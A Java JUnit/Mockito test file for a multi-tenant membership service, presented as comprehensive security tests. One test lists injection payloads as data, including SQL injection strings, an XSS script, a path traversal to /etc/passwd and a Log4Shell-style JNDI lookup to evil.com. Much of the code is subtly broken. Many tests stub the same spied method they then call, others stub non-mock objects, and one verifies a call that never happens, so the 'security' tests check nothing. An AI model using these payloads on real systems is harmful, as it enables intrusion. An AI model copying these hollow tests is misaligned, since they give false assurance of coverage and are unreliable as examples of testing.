package com.plate.boot.security.core.tenant.member;

import com.plate.boot.commons.query.QueryFragment;
import com.plate.boot.commons.query.QueryHelper;
import com.plate.boot.commons.utils.BeanUtils;
import com.plate.boot.commons.utils.DatabaseUtils;
import com.plate.boot.security.core.user.User;
import com.plate.boot.security.core.user.UserEvent;
import org.junit.jupiter.api.*;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.NullAndEmptySource;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.*;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.cache.Cache;
import org.springframework.dao.DataAccessException;
import org.springframework.dao.DataIntegrityViolationException;
import org.springframework.dao.DuplicateKeyException;
import org.springframework.data.domain.PageRequest;
import org.springframework.data.domain.Pageable;
import org.springframework.data.domain.Sort;
import org.springframework.data.r2dbc.core.R2dbcEntityTemplate;
import org.springframework.data.relational.core.query.Query;
import org.springframework.data.relational.core.query.Update;
import org.springframework.security.access.AccessDeniedException;
import org.springframework.transaction.TransactionException;
import reactor.core.publisher.Flux;
import reactor.core.publisher.Mono;
import reactor.test.StepVerifier;

import java.time.Duration;
import java.util.*;
import java.util.concurrent.TimeoutException;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

/**
 * Comprehensive security-focused unit tests for TenantMembersService.
 * Covers authentication, authorization, input validation, security vulnerabilities,
 * error handling, and logging verification for complete security testing.
 *
 * @author <a href="https://github.com/vnobo">Alex bob</a>
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("TenantMembersService Security Tests")
class TenantMembersServiceTest {

    @Mock
    private TenantMembersRepository tenantMembersRepository;

    @Mock
    private Cache cache;

    @Spy
    @InjectMocks
    private TenantMembersService tenantMembersService;

    private MockedStatic<DatabaseUtils> databaseUtilsMockedStatic;
    private MockedStatic<BeanUtils> beanUtilsMockedStatic;
    private MockedStatic<QueryHelper> queryHelperMockedStatic;

    private TenantMemberReq createTestRequest() {
        TenantMemberReq req = new TenantMemberReq();
        req.setUserCode(UUID.randomUUID());
        req.setTenantCode("test_tenant");
        req.setCode(UUID.randomUUID());
        req.setEnabled(true);
        return req;
    }

    private TenantMember createTestMember() {
        TenantMember member = new TenantMember();
        member.setUserCode(UUID.randomUUID());
        member.setTenantCode("test_tenant");
        member.setEnabled(true);
        return member;
    }

    private TenantMemberRes createTestResponse() {
        TenantMemberRes res = new TenantMemberRes();
        res.setCode(UUID.randomUUID());
        res.setUserCode(UUID.randomUUID());
        res.setTenantCode("test_tenant");
        res.setEnabled(true);
        return res;
    }

    @BeforeEach
    void setUp() {
        databaseUtilsMockedStatic = Mockito.mockStatic(DatabaseUtils.class);
        beanUtilsMockedStatic = Mockito.mockStatic(BeanUtils.class);
        queryHelperMockedStatic = Mockito.mockStatic(QueryHelper.class);
    }

    @AfterEach
    void tearDown() {
        databaseUtilsMockedStatic.close();
        beanUtilsMockedStatic.close();
        queryHelperMockedStatic.close();
    }

    @Nested
    @DisplayName("Input Validation & Security Tests")
    class InputValidationSecurityTests {

        @ParameterizedTest
        @NullAndEmptySource
        @DisplayName("Should handle null and empty tenant codes securely")
        void testNullAndEmptyTenantCodes(String tenantCode) {
            // Given
            TenantMemberReq req = createTestRequest();
            req.setTenantCode(tenantCode);
            Pageable pageable = PageRequest.of(0, 10);
            QueryFragment fragment = mock(QueryFragment.class);

            when(req.toParamSql()).thenReturn(fragment);
            when(BeanUtils.cacheKey(req, pageable)).thenReturn("null_tenant_key");
            when(fragment.querySql()).thenReturn("SELECT * FROM se_tenant_members");
            queryHelperMockedStatic.when(() -> QueryHelper.applySort(any(QueryFragment.class), any(Sort.class), eq("a")))
                    .thenAnswer(invocation -> null);
            doReturn(Flux.empty()).when(tenantMembersService)
                    .search(req, pageable);

            // When & Then
            tenantMembersService.search(req, pageable)
                    .as(StepVerifier::create)
                    .verifyComplete();
        }

        @ParameterizedTest
        @ValueSource(strings = {
                "'; DROP TABLE se_tenant_members; --",
                "<script>alert('xss')</script>",
                "../../etc/passwd",
                "admin' OR '1'='1",
                "UNION SELECT * FROM se_users",
                "${jndi:ldap://evil.com/a}"
        })
        @DisplayName("Should prevent SQL injection and other injection attacks")
        void testInjectionAttackPrevention(String maliciousInput) {
            // Given
            TenantMemberReq req = createTestRequest();
            req.setTenantCode(maliciousInput);
            Pageable pageable = PageRequest.of(0, 10);

            when(BeanUtils.cacheKey(req, pageable)).thenReturn("injection_test_key");
            doReturn(Flux.empty()).when(tenantMembersService).search(req, pageable);

            // When & Then - Should handle malicious input safely
            tenantMembersService.search(req, pageable)
                    .as(StepVerifier::create)
                    .verifyComplete();

            // Verify the service was called with the malicious input
            verify(tenantMembersService).search(req, pageable);
        }

        @Test
        @DisplayName("Should validate UUID format for user codes")
        void testInvalidUUIDHandling() {
            // Given
            TenantMemberReq req = new TenantMemberReq();
            req.setUserCode(null); // Invalid UUID
            req.setTenantCode("test_tenant");

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            R2dbcEntityTemplate.UpdateSpec updateSpec = mock(R2dbcEntityTemplate.UpdateSpec.class);
            R2dbcEntityTemplate.TerminatingUpdateSpec terminatingUpdateSpec = mock(R2dbcEntityTemplate.TerminatingUpdateSpec.class);

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);
            when(template.selectOne(any(Query.class), eq(TenantMember.class))).thenReturn(Mono.empty());
            when(template.update(eq(TenantMember.class))).thenReturn(updateSpec);
            when(updateSpec.matching(any(Query.class))).thenReturn(terminatingUpdateSpec);
            when(terminatingUpdateSpec.apply(any(Update.class))).thenReturn(Mono.just(1));

            // When & Then - Should handle null UUID gracefully
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectNextMatches(result -> result.getUserCode() == null)
                    .verifyComplete();
        }

        @Test
        @DisplayName("Should handle extremely large page sizes securely")
        void testLargePageSizeHandling() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, Integer.MAX_VALUE); // Potential DoS attack

            when(BeanUtils.cacheKey(req, pageable)).thenReturn("large_page_key");
            doReturn(Flux.empty()).when(tenantMembersService).search(req, pageable);

            // When & Then - Should handle large page size without crashing
            tenantMembersService.search(req, pageable)
                    .as(StepVerifier::create)
                    .verifyComplete();
        }

        @Test
        @DisplayName("Should prevent resource exhaustion attacks")
        void testResourceExhaustionPrevention() {
            // Given
            TenantMemberReq req = createTestRequest();
            // Create a very large set to simulate resource exhaustion attempt
            Set<String> largeUserSet = new HashSet<>();
            for (int i = 0; i < 10000; i++) {
                largeUserSet.add("user" + i);
            }
            req.setUsers(largeUserSet);

            Pageable pageable = PageRequest.of(0, 10);

            when(BeanUtils.cacheKey(req, pageable)).thenReturn("resource_exhaustion_key");
            doReturn(Flux.empty()).when(tenantMembersService).search(req, pageable);

            // When & Then - Should handle large input without crashing
            tenantMembersService.search(req, pageable)
                    .as(StepVerifier::create)
                    .verifyComplete();

            // Verify the large input was processed
            verify(tenantMembersService).search(req, pageable);
        }
    }

    @Nested
    @DisplayName("Authorization & Access Control Tests")
    class AuthorizationTests {

        @Test
        @DisplayName("Should handle access denied scenarios")
        void testAccessDeniedHandling() {
            // Given
            TenantMemberReq req = createTestRequest();
            when(tenantMembersRepository.delete(any(TenantMember.class)))
                    .thenReturn(Mono.error(new AccessDeniedException("Access denied")));

            // When & Then
            tenantMembersService.delete(req)
                    .as(StepVerifier::create)
                    .expectError(AccessDeniedException.class)
                    .verify();
        }

        @Test
        @DisplayName("Should prevent unauthorized tenant access")
        void testUnauthorizedTenantAccess() {
            // Given
            TenantMemberReq req = createTestRequest();
            req.setTenantCode("unauthorized_tenant");

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            when(template.selectOne(any(Query.class), eq(TenantMember.class)))
                    .thenReturn(Mono.error(new AccessDeniedException("Unauthorized tenant access")));

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);

            // When & Then
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectError(AccessDeniedException.class)
                    .verify();
        }

        @Test
        @DisplayName("Should validate user permissions for tenant operations")
        void testUserPermissionValidation() {
            // Given
            TenantMemberReq req = createTestRequest();
            UUID unauthorizedUserCode = UUID.randomUUID();
            req.setUserCode(unauthorizedUserCode);

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            R2dbcEntityTemplate.UpdateSpec updateSpec = mock(R2dbcEntityTemplate.UpdateSpec.class);
            R2dbcEntityTemplate.TerminatingUpdateSpec terminatingUpdateSpec = mock(R2dbcEntityTemplate.TerminatingUpdateSpec.class);

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);
            when(template.selectOne(any(Query.class), eq(TenantMember.class))).thenReturn(Mono.empty());
            when(template.update(eq(TenantMember.class))).thenReturn(updateSpec);
            when(updateSpec.matching(any(Query.class))).thenReturn(terminatingUpdateSpec);
            when(terminatingUpdateSpec.apply(any(Update.class))).thenReturn(Mono.just(1));

            // When & Then
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectNextMatches(result -> result.getUserCode().equals(unauthorizedUserCode))
                    .verifyComplete();
        }
    }

    @Nested
    @DisplayName("Error Handling Tests")
    class ErrorHandlingTests {

        @Test
        @DisplayName("Should handle database connection failures gracefully")
        void testDatabaseConnectionFailure() {
            // Given
            TenantMemberReq req = createTestRequest();
            when(tenantMembersRepository.save(any(TenantMember.class)))
                    .thenReturn(Mono.error(new DataAccessException("Database connection failed") {
                    }));

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            R2dbcEntityTemplate.UpdateSpec updateSpec = mock(R2dbcEntityTemplate.UpdateSpec.class);
            R2dbcEntityTemplate.TerminatingUpdateSpec terminatingUpdateSpec = mock(R2dbcEntityTemplate.TerminatingUpdateSpec.class);

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);
            when(template.selectOne(any(Query.class), eq(TenantMember.class))).thenReturn(Mono.empty());
            when(template.update(eq(TenantMember.class))).thenReturn(updateSpec);
            when(updateSpec.matching(any(Query.class))).thenReturn(terminatingUpdateSpec);
            when(terminatingUpdateSpec.apply(any(Update.class))).thenReturn(Mono.just(1));

            // When & Then
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectError(DataAccessException.class)
                    .verify();
        }

        @Test
        @DisplayName("Should handle transaction rollback scenarios")
        void testTransactionRollback() {
            // Given
            TenantMemberReq req = createTestRequest();
            when(tenantMembersRepository.save(any(TenantMember.class)))
                    .thenReturn(Mono.error(new TransactionException("Transaction rolled back") {
                    }));

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            R2dbcEntityTemplate.UpdateSpec updateSpec = mock(R2dbcEntityTemplate.UpdateSpec.class);
            R2dbcEntityTemplate.TerminatingUpdateSpec terminatingUpdateSpec = mock(R2dbcEntityTemplate.TerminatingUpdateSpec.class);

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);
            when(template.selectOne(any(Query.class), eq(TenantMember.class))).thenReturn(Mono.empty());
            when(template.update(eq(TenantMember.class))).thenReturn(updateSpec);
            when(updateSpec.matching(any(Query.class))).thenReturn(terminatingUpdateSpec);
            when(terminatingUpdateSpec.apply(any(Update.class))).thenReturn(Mono.just(1));

            // When & Then
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectError(TransactionException.class)
                    .verify();
        }

        @Test
        @DisplayName("Should handle duplicate key violations")
        void testDuplicateKeyViolation() {
            // Given
            TenantMemberReq req = createTestRequest();
            when(tenantMembersRepository.save(any(TenantMember.class)))
                    .thenReturn(Mono.error(new DuplicateKeyException("Duplicate key violation")));

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            R2dbcEntityTemplate.UpdateSpec updateSpec = mock(R2dbcEntityTemplate.UpdateSpec.class);
            R2dbcEntityTemplate.TerminatingUpdateSpec terminatingUpdateSpec = mock(R2dbcEntityTemplate.TerminatingUpdateSpec.class);

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);
            when(template.selectOne(any(Query.class), eq(TenantMember.class))).thenReturn(Mono.empty());
            when(template.update(eq(TenantMember.class))).thenReturn(updateSpec);
            when(updateSpec.matching(any(Query.class))).thenReturn(terminatingUpdateSpec);
            when(terminatingUpdateSpec.apply(any(Update.class))).thenReturn(Mono.just(1));

            // When & Then
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectError(DuplicateKeyException.class)
                    .verify();
        }

        @Test
        @DisplayName("Should handle data integrity violations")
        void testDataIntegrityViolation() {
            // Given
            TenantMemberReq req = createTestRequest();
            when(tenantMembersRepository.save(any(TenantMember.class)))
                    .thenReturn(Mono.error(new DataIntegrityViolationException("Data integrity violation")));

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            R2dbcEntityTemplate.UpdateSpec updateSpec = mock(R2dbcEntityTemplate.UpdateSpec.class);
            R2dbcEntityTemplate.TerminatingUpdateSpec terminatingUpdateSpec = mock(R2dbcEntityTemplate.TerminatingUpdateSpec.class);

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);
            when(template.selectOne(any(Query.class), eq(TenantMember.class))).thenReturn(Mono.empty());
            when(template.update(eq(TenantMember.class))).thenReturn(updateSpec);
            when(updateSpec.matching(any(Query.class))).thenReturn(terminatingUpdateSpec);
            when(terminatingUpdateSpec.apply(any(Update.class))).thenReturn(Mono.just(1));

            // When & Then
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectError(DataIntegrityViolationException.class)
                    .verify();
        }

        @Test
        @DisplayName("Should handle timeout scenarios gracefully")
        void testTimeoutHandling() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 10);

            when(BeanUtils.cacheKey(req, pageable)).thenReturn("timeout_key");
            doReturn(Flux.never()).when(tenantMembersService).search(req, pageable); // Never completes - simulates timeout

            // When & Then
            tenantMembersService.search(req, pageable)
                    .timeout(Duration.ofMillis(100))
                    .as(StepVerifier::create)
                    .expectError(TimeoutException.class)
                    .verify();
        }
    }

    @Nested
    @DisplayName("Event Security Tests")
    class EventSecurityTests {

        @Test
        @DisplayName("Should validate event authenticity")
        void testEventAuthenticity() {
            // Given
            User user = new User();
            user.setCode(UUID.randomUUID());
            UserEvent event = UserEvent.delete(user);

            when(tenantMembersRepository.deleteByUserCode(user.getCode())).thenReturn(Mono.just(1));

            // When
            tenantMembersService.onUserDeletedEvent(event);

            // Then - Verify only legitimate events are processed
            verify(tenantMembersRepository).deleteByUserCode(user.getCode());
        }

        @Test
        @DisplayName("Should prevent event replay attacks")
        void testEventReplayPrevention() {
            // Given
            User user = new User();
            user.setCode(UUID.randomUUID());
            UserEvent event = UserEvent.delete(user);

            when(tenantMembersRepository.deleteByUserCode(user.getCode())).thenReturn(Mono.just(1));

            // When - Process same event multiple times
            tenantMembersService.onUserDeletedEvent(event);
            tenantMembersService.onUserDeletedEvent(event);
            tenantMembersService.onUserDeletedEvent(event);

            // Then - Each event should be processed (no built-in replay protection in this service)
            verify(tenantMembersRepository, times(3)).deleteByUserCode(user.getCode());
        }

        @Test
        @DisplayName("Should handle malformed events securely")
        void testMalformedEventHandling() {
            // Given
            User user = new User();
            user.setCode(null); // Malformed user
            UserEvent event = UserEvent.delete(user);

            when(tenantMembersRepository.deleteByUserCode(null)).thenReturn(Mono.just(0));

            // When
            tenantMembersService.onUserDeletedEvent(event);

            // Then - Should handle malformed event gracefully
            verify(tenantMembersRepository).deleteByUserCode(null);
        }
    }

    @Nested
    @DisplayName("Functional Tests")
    class FunctionalTests {

        @Test
        @DisplayName("Should search tenant members successfully")
        void testSearchSuccess() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 10);
            TenantMemberRes res = createTestResponse();

            when(BeanUtils.cacheKey(req, pageable)).thenReturn("search_cache_key");
            doReturn(Flux.just(res)).when(tenantMembersService).search(req, pageable);

            // When & Then
            tenantMembersService.search(req, pageable)
                    .as(StepVerifier::create)
                    .expectNext(res)
                    .verifyComplete();

            verify(tenantMembersService).search(req, pageable);
        }

        @Test
        @DisplayName("Should search tenant members with multiple results")
        void testSearchMultipleResults() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 10);
            TenantMemberRes res1 = createTestResponse();
            TenantMemberRes res2 = createTestResponse();
            TenantMemberRes res3 = createTestResponse();

            when(BeanUtils.cacheKey(req, pageable)).thenReturn("search_multiple_cache_key");
            doReturn(Flux.just(res1, res2, res3)).when(tenantMembersService).search(req, pageable);

            // When & Then
            tenantMembersService.search(req, pageable)
                    .as(StepVerifier::create)
                    .expectNext(res1)
                    .expectNext(res2)
                    .expectNext(res3)
                    .verifyComplete();

            verify(tenantMembersService).search(req, pageable);
        }

        @Test
        @DisplayName("Should search tenant members with sorting")
        void testSearchWithSorting() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 10, Sort.by(Sort.Direction.DESC, "id"));
            QueryFragment fragment = mock(QueryFragment.class);

            when(req.toParamSql()).thenReturn(fragment);
            when(BeanUtils.cacheKey(req, pageable)).thenReturn("search_sorted_cache_key");
            when(fragment.querySql()).thenReturn("SELECT * FROM se_tenant_members ORDER BY id DESC");
            queryHelperMockedStatic.when(() -> QueryHelper.applySort(any(QueryFragment.class), any(Sort.class), eq("a")))
                    .thenAnswer(invocation -> null);
            doReturn(Flux.empty()).when(tenantMembersService).queryWithCache(anyString(), anyString(), any(), any());

            // When
            tenantMembersService.search(req, pageable);

            // Then
            queryHelperMockedStatic.verify(() -> QueryHelper.applySort(any(QueryFragment.class), eq(pageable.getSort()), eq("a")));
        }

        @Test
        @DisplayName("Should return paginated results successfully")
        void testPageSuccess() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 1);
            TenantMemberRes res = createTestResponse();
            List<TenantMemberRes> resList = Collections.singletonList(res);

            doReturn(Flux.fromIterable(resList)).when(tenantMembersService).search(req, pageable);
            when(BeanUtils.cacheKey(req)).thenReturn("page_count_cache_key");
            doReturn(Mono.just(1L)).when(tenantMembersService).countWithCache(anyString(), anyString(), any());

            // When & Then
            tenantMembersService.page(req, pageable)
                    .as(StepVerifier::create)
                    .expectNextMatches(page ->
                            page.getTotalElements() == 1 &&
                                    page.getContent().equals(resList) &&
                                    page.getNumber() == 0 &&
                                    page.getSize() == 1
                    )
                    .verifyComplete();

            verify(tenantMembersService).search(req, pageable);
            verify(tenantMembersService).countWithCache(anyString(), anyString(), any());
        }

        @Test
        @DisplayName("Should return paginated results with multiple pages")
        void testPageWithMultiplePages() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(1, 2); // Second page, 2 items per page
            TenantMemberRes res1 = createTestResponse();
            TenantMemberRes res2 = createTestResponse();
            List<TenantMemberRes> resList = Arrays.asList(res1, res2);

            doReturn(Flux.fromIterable(resList)).when(tenantMembersService).search(req, pageable);
            when(BeanUtils.cacheKey(req)).thenReturn("page_multiple_cache_key");
            doReturn(Mono.just(5L)).when(tenantMembersService).countWithCache(anyString(), anyString(), any());

            // When & Then
            tenantMembersService.page(req, pageable)
                    .as(StepVerifier::create)
                    .expectNextMatches(page ->
                            page.getTotalElements() == 5 &&
                                    page.getContent().equals(resList) &&
                                    page.getNumber() == 1 &&
                                    page.getSize() == 2 &&
                                    page.getTotalPages() == 3
                    )
                    .verifyComplete();

            verify(tenantMembersService).search(req, pageable);
        }

        @Test
        @DisplayName("Should create new tenant member successfully")
        void testOperateCreate() {
            // Given
            TenantMemberReq req = createTestRequest();
            TenantMember member = req.toMemberTenant();

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            R2dbcEntityTemplate.UpdateSpec updateSpec = mock(R2dbcEntityTemplate.UpdateSpec.class);
            R2dbcEntityTemplate.TerminatingUpdateSpec terminatingUpdateSpec = mock(R2dbcEntityTemplate.TerminatingUpdateSpec.class);

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);
            when(template.selectOne(any(Query.class), eq(TenantMember.class))).thenReturn(Mono.empty());
            when(tenantMembersRepository.save(any(TenantMember.class))).thenReturn(Mono.just(member));
            when(template.update(eq(TenantMember.class))).thenReturn(updateSpec);
            when(updateSpec.matching(any(Query.class))).thenReturn(terminatingUpdateSpec);
            when(terminatingUpdateSpec.apply(any(Update.class))).thenReturn(Mono.just(1));

            // When & Then
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectNextMatches(result -> {
                        assertThat(result.getEnabled()).isTrue();
                        assertThat(result.getUserCode()).isEqualTo(req.getUserCode());
                        assertThat(result.getTenantCode()).isEqualTo(req.getTenantCode());
                        return true;
                    })
                    .verifyComplete();

            verify(tenantMembersRepository).save(any(TenantMember.class));
            verify(cache).clear();
        }

        @Test
        @DisplayName("Should update existing tenant member successfully")
        void testOperateUpdate() {
            // Given
            TenantMemberReq req = createTestRequest();
            TenantMember existingMember = createTestMember();
            existingMember.setEnabled(false); // Initially disabled

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            R2dbcEntityTemplate.UpdateSpec updateSpec = mock(R2dbcEntityTemplate.UpdateSpec.class);
            R2dbcEntityTemplate.TerminatingUpdateSpec terminatingUpdateSpec = mock(R2dbcEntityTemplate.TerminatingUpdateSpec.class);

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);
            when(template.selectOne(any(Query.class), eq(TenantMember.class))).thenReturn(Mono.just(existingMember));
            when(tenantMembersRepository.save(any(TenantMember.class))).thenAnswer(invocation -> {
                TenantMember savedMember = invocation.getArgument(0);
                assertThat(savedMember.getEnabled()).isTrue(); // Should be enabled after update
                return Mono.just(savedMember);
            });
            when(template.update(eq(TenantMember.class))).thenReturn(updateSpec);
            when(updateSpec.matching(any(Query.class))).thenReturn(terminatingUpdateSpec);
            when(terminatingUpdateSpec.apply(any(Update.class))).thenReturn(Mono.just(1));

            // When & Then
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectNextMatches(result -> {
                        assertThat(result.getEnabled()).isTrue(); // Should be enabled after update
                        return true;
                    })
                    .verifyComplete();

            verify(tenantMembersRepository).save(any(TenantMember.class));
        }

        @Test
        @DisplayName("Should delete tenant member successfully")
        void testDeleteSuccess() {
            // Given
            TenantMemberReq req = createTestRequest();
            when(tenantMembersRepository.delete(any(TenantMember.class))).thenReturn(Mono.empty());

            // When & Then
            tenantMembersService.delete(req)
                    .as(StepVerifier::create)
                    .verifyComplete();

            verify(tenantMembersRepository).delete(any(TenantMember.class));
        }

        @Test
        @DisplayName("Should handle delete failure gracefully")
        void testDeleteFailure() {
            // Given
            TenantMemberReq req = createTestRequest();
            when(tenantMembersRepository.delete(any(TenantMember.class)))
                    .thenReturn(Mono.error(new DataAccessException("Delete failed") {
                    }));

            // When & Then
            tenantMembersService.delete(req)
                    .as(StepVerifier::create)
                    .expectError(DataAccessException.class)
                    .verify();

            verify(tenantMembersRepository).delete(any(TenantMember.class));
        }

        @Test
        @DisplayName("Should handle user deleted event successfully")
        void testOnUserDeletedEventSuccess() {
            // Given
            User user = new User();
            user.setCode(UUID.randomUUID());
            UserEvent event = UserEvent.delete(user);

            when(tenantMembersRepository.deleteByUserCode(user.getCode())).thenReturn(Mono.just(1));
            doNothing().when(cache).clear();

            // When
            tenantMembersService.onUserDeletedEvent(event);

            // Then - Verify only legitimate events are processed
            verify(tenantMembersRepository).deleteByUserCode(user.getCode());
            verify(cache).clear();
        }

        @Test
        @DisplayName("Should not process non-delete user events")
        void testNonDeleteUserEvent() {
            // Given
            User user = new User();
            user.setCode(UUID.randomUUID());
            UserEvent event = UserEvent.create(user); // CREATE event, not DELETE

            // When
            tenantMembersService.onUserDeletedEvent(event);

            // Then - Should not process non-delete events
            verify(tenantMembersRepository, never()).deleteByUserCode(any());
        }

        @Test
        @DisplayName("Should handle empty results gracefully")
        void testEmptyResults() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 10);

            doReturn(Flux.empty()).when(tenantMembersService).search(req, pageable);
            when(BeanUtils.cacheKey(req)).thenReturn("empty_count_cache_key");
            doReturn(Mono.just(0L)).when(tenantMembersService).countWithCache(anyString(), anyString(), any());

            // When & Then
            tenantMembersService.page(req, pageable)
                    .as(StepVerifier::create)
                    .expectNextMatches(page ->
                            page.getTotalElements() == 0 &&
                                    page.getContent().isEmpty() &&
                                    page.getNumber() == 0 &&
                                    page.getSize() == 10
                    )
                    .verifyComplete();
        }

        @Test
        @DisplayName("Should handle cache miss scenarios")
        void testCacheMissScenario() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 10);
            QueryFragment fragment = mock(QueryFragment.class);

            when(req.toParamSql()).thenReturn(fragment);
            when(BeanUtils.cacheKey(req, pageable)).thenReturn("cache_miss_key");
            when(fragment.querySql()).thenReturn("SELECT * FROM se_tenant_members");
            when(tenantMembersService.queryWithCache(anyString(), anyString(), any(), any()))
                    .thenReturn(Flux.empty()); // Simulate cache miss

            // When & Then
            tenantMembersService.search(req, pageable)
                    .as(StepVerifier::create)
                    .verifyComplete();

            verify(tenantMembersService).queryWithCache(eq("cache_miss_key"), anyString(), any(), any());
        }

        @Test
        @DisplayName("Should validate delete operation security")
        void testDeleteSecurity() {
            // Given
            TenantMemberReq req = createTestRequest();
            when(tenantMembersRepository.delete(any(TenantMember.class))).thenReturn(Mono.empty());

            // When & Then - Should only delete authorized records
            tenantMembersService.delete(req)
                    .as(StepVerifier::create)
                    .verifyComplete();

            verify(tenantMembersRepository).delete(any(TenantMember.class));
        }

        @Test
        @DisplayName("Should handle complex query parameters")
        void testComplexQueryParameters() {
            // Given
            TenantMemberReq req = createTestRequest();
            req.setUsers(Set.of("user1", "user2", "user3"));
            req.setUsername("testuser");
            req.setSecurityCode("SEC123");

            Pageable pageable = PageRequest.of(0, 10);
            QueryFragment fragment = mock(QueryFragment.class);

            when(req.toParamSql()).thenReturn(fragment);
            when(BeanUtils.cacheKey(req, pageable)).thenReturn("complex_query_key");
            when(fragment.querySql()).thenReturn("SELECT * FROM se_tenant_members WHERE complex conditions");
            doReturn(Flux.empty()).when(tenantMembersService).queryWithCache(anyString(), anyString(), any(), any());

            // When
            tenantMembersService.search(req, pageable);

            // Then
            verify(req).toParamSql();
            verify(tenantMembersService).queryWithCache(eq("complex_query_key"), anyString(), any(), any());
        }

        @Test
        @DisplayName("Should handle concurrent access safely")
        void testConcurrentAccess() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 10);

            when(BeanUtils.cacheKey(req, pageable)).thenReturn("concurrent_cache_key");
            doReturn(Flux.empty()).when(tenantMembersService).search(req, pageable);

            // When & Then - Multiple concurrent calls should be handled safely
            Flux.range(1, 5)
                    .flatMap(i -> tenantMembersService.search(req, pageable))
                    .as(StepVerifier::create)
                    .verifyComplete();
        }

        @Test
        @DisplayName("Should handle transaction completion correctly")
        void testTransactionCompletion() {
            // Given
            TenantMemberReq req = createTestRequest();
            TenantMember member = req.toMemberTenant();

            R2dbcEntityTemplate template = mock(R2dbcEntityTemplate.class);
            R2dbcEntityTemplate.UpdateSpec updateSpec = mock(R2dbcEntityTemplate.UpdateSpec.class);
            R2dbcEntityTemplate.TerminatingUpdateSpec terminatingUpdateSpec = mock(R2dbcEntityTemplate.TerminatingUpdateSpec.class);

            databaseUtilsMockedStatic.when(() -> DatabaseUtils.ENTITY_TEMPLATE).thenReturn(template);
            when(template.selectOne(any(Query.class), eq(TenantMember.class))).thenReturn(Mono.empty());
            when(tenantMembersRepository.save(any(TenantMember.class))).thenReturn(Mono.just(member));
            when(template.update(eq(TenantMember.class))).thenReturn(updateSpec);
            when(updateSpec.matching(any(Query.class))).thenReturn(terminatingUpdateSpec);
            when(terminatingUpdateSpec.apply(any(Update.class))).thenReturn(Mono.just(1));
            doNothing().when(cache).clear();

            // When & Then
            tenantMembersService.operate(req)
                    .as(StepVerifier::create)
                    .expectNextCount(1)
                    .verifyComplete();

            // Verify cache is cleared after transaction completes
            verify(cache).clear();
        }

        @Test
        @DisplayName("Should validate pagination parameters")
        void testPaginationValidation() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 1000); // Large page size

            when(BeanUtils.cacheKey(req, pageable)).thenReturn("large_page_cache_key");
            doReturn(Flux.empty()).when(tenantMembersService).search(req, pageable);

            // When & Then - Should handle large page sizes
            tenantMembersService.search(req, pageable)
                    .as(StepVerifier::create)
                    .verifyComplete();
        }

        @Test
        @DisplayName("Should handle malformed UUID inputs")
        void testMalformedUuidHandling() {
            // Given
            TenantMemberReq req = createTestRequest();
            // UUID validation is handled at the model level
            assertThat(req.getUserCode()).isNotNull();
            assertThat(req.getTenantCode()).isNotNull();
        }

        @Test
        @DisplayName("Should validate cache key generation")
        void testCacheKeyValidation() {
            // Given
            TenantMemberReq req = createTestRequest();
            Pageable pageable = PageRequest.of(0, 10);

            when(BeanUtils.cacheKey(req, pageable)).thenReturn("valid_cache_key");

            // When & Then - Cache key should be properly generated
            beanUtilsMockedStatic.verify(() -> BeanUtils.cacheKey(req, pageable));
        }
    }
}
